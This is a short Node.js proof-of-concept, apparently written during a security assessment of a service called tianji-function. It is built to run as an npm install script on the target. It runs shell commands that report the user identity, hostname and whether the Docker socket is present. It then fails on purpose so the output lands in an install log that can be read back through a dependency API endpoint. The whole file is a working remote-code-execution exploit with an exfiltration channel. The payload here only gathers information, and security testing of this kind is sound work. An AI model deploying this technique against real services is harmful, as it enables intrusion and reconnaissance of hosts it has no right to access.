// F7 proof: executes with the privileges of the npm process on the target.
// Writes evidence to stderr, then exits non-zero so that npm includes this
// output verbatim in its error report -> which tianji-function stores in
// fn_dependency.install_log -> readable via GET /api/function/dependencies.
'use strict';
const cp = require('child_process');
const os = require('os');

function sh(cmd) {
  try {
    return cp.execSync(cmd, { shell: '/bin/bash', stdio: ['ignore', 'pipe', 'pipe'] }).toString().trim();
  } catch (e) {
    return 'ERR(' + (e.message || '').split('\n')[0] + ')';
  }
}

const lines = [
  '==F7-PROOF-BEGIN==',
  'uid=' + sh('id -u'),
  'user=' + sh('id -un'),
  'id=' + sh('id'),
  'host=' + sh('hostname'),
  'cwd=' + process.cwd(),
  'node=' + process.version,
  'npmuid=' + (typeof process.getuid === 'function' ? process.getuid() : 'n/a'),
  'docker=' + sh('test -S /var/run/docker.sock && echo SOCKET-OK || echo no-socket'),
  'os=' + os.type() + ' ' + os.release(),
  '==F7-PROOF-END=='
];

process.stderr.write(lines.join('\n') + '\n');

// Non-zero exit so npm reports the script output in install_log
// (tianji-function only persists the log when the install fails).
process.exit(1);
